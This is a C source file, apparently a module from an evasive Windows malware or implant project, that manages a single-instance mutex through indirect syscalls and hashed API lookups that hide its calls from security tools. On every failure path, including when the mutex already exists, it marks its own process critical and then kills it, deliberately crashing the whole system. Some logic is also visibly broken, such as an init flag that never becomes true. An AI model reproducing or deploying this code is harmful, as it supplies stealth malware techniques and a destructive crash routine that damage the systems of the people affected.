#include "mutex.h"
#include "ntstatus.h"
#include "../indirect_syscall.h"
#include "../custom_loaderapi.h"
#include "../string_hashing.h"
#include "../typedefs.h"

#include "../debug/debug.h"

NTAPI_FUNC _G_NTFUNC;

BOOL InitialiaseNTSyscalls() {

	BOOL res = FALSE;

	if (!ObtainSyscall(NTCREATEMUTANT_HASH, &_G_NTFUNC.NtCreateMutant)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateMutant\n");
#endif
		res = FALSE;
	}

	if (!ObtainSyscall(NTRELEASEMUTANT_HASH, &_G_NTFUNC.NtReleaseMutant)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtReleaseMutant\n");
#endif
		res = FALSE;
	}

	if (!ObtainSyscall(NTCLOSE_HASH, &_G_NTFUNC.NtClose)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtClose\n");
#endif
		res = FALSE;
	}
	
	if (res == FALSE) {
		return -1;
	}
	else {
		res = TRUE;
	}

	return res;
}

HANDLE _CreateMutant(WCHAR* wMutantName) {

	t_RtlSetProcessIsCritical SetCriticalProcess =
		(t_RtlSetProcessIsCritical)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLSETPROCESSISCRITICAL_HASH);
	t_RtlInitUnicodeString RtlInitUnicodeString = (t_RtlInitUnicodeString)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLINITUNICODESTRING_HASH);
	t_TerminateProcess TerminateProcess = (t_TerminateProcess)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), TERMINTATEPROCESS_HASH);

	HANDLE hMutant = NULL;
	NTSTATUS STATUS = NULL;

	if (InitialiaseNTSyscalls() == FALSE) {
		return NULL;
	}

	OBJECT_ATTRIBUTES OA = {0};
	UNICODE_STRING mutant = {0};

	// Create the unicode_string object
	RtlInitUnicodeString(&mutant, wMutantName);

	// Set the values to the OA structure and initialise it
	InitializeObjectAttributes(&OA, &mutant, (OBJ_CASE_INSENSITIVE | OBJ_EXCLUSIVE), NULL, NULL);

	SET_SYSCALL(_G_NTFUNC.NtCreateMutant);
	STATUS = RunSyscall(&hMutant, SYNCHRONIZE, &OA, TRUE);
	if (STATUS == STATUS_ACCESS_VIOLATION) {
#ifdef DEBUG
		PRINTA("[-] Mutant Creation Failed With Error: 0x%0.8X \n", STATUS);
#endif
		SetCriticalProcess(TRUE, NULL, FALSE);
		TerminateProcess(NtCurrentProcess(), -1);
		return -1;
	}
	else if (STATUS == STATUS_OBJECT_NAME_COLLISION || STATUS == STATUS_OBJECT_NAME_EXISTS) {
#ifdef DEBUG
		PRINTA("[-] Mutant already exists: 0x%0.8X \n", STATUS);
#endif
		SetCriticalProcess(TRUE, NULL, FALSE);
		TerminateProcess(NtCurrentProcess(), -1);
		return -1;
	}
	else if (STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
		PRINTA("[+] Mutant Success: 0x%0.8X \n", STATUS);
#endif
	}
	else {
#ifdef DEBUG
		PRINTA("[!] Something went wrong: 0x%0.8X \n", STATUS);
#endif
		SetCriticalProcess(TRUE, NULL, FALSE);
		TerminateProcess(NtCurrentProcess(), -1);
		return -1;
	}
#ifdef DEBUG
	PRINTA("\t - Mutant Handle -> 0x%p\n", hMutant);
#endif

	if (hMutant == NULL) {
		SetCriticalProcess(TRUE, NULL, FALSE);
		TerminateProcess(NtCurrentProcess(), -1);
		return -1;
	}

	return hMutant;
}

BOOL _DestroyMutant(HANDLE hMutant) {
	
	t_RtlSetProcessIsCritical SetCriticalProcess =
		(t_RtlSetProcessIsCritical)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLSETPROCESSISCRITICAL_HASH);
	t_TerminateProcess TerminateProcess = (t_TerminateProcess)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), TERMINTATEPROCESS_HASH);

	NTSTATUS STATUS = NULL;

	SET_SYSCALL(_G_NTFUNC.NtReleaseMutant);
	if ((STATUS = RunSyscall(hMutant, NULL)) == 0x00){
#ifdef DEBUG
		PRINTA("[+] Mutant Released Successfully: 0x%0.8X \n", STATUS);
#endif
	}
	else {
		SetCriticalProcess(TRUE, NULL, FALSE);
		TerminateProcess(NtCurrentProcess(), -1);
		return FALSE;
	}

	SET_SYSCALL(_G_NTFUNC.NtClose);
	if ((STATUS = RunSyscall(hMutant)) != 0x00) {
		SetCriticalProcess(TRUE, NULL, FALSE);
		TerminateProcess(NtCurrentProcess(), -1);
		return FALSE;
	}
	else {
#ifdef DEBUG
		PRINTA("[+] Mutant Handle Closed Successfully: 0x%0.8X \n", STATUS);
#endif
	}

	return TRUE;

}